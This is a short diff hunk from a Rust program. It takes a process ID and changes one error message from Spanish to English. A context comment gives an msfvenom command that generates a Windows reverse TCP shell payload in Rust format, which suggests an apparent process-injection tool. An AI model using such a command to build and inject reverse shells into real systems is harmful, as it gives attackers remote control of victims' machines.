@@ -23,7 +23,7 @@ fn main() {
         }
 
         let pid = args[1].parse::<u32>().unwrap_or_else(|_e| {
-            println!("Formato PID Error");
+            println!("PID error format");
             std::process::exit(0)
         });
         // msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f rust -v buf
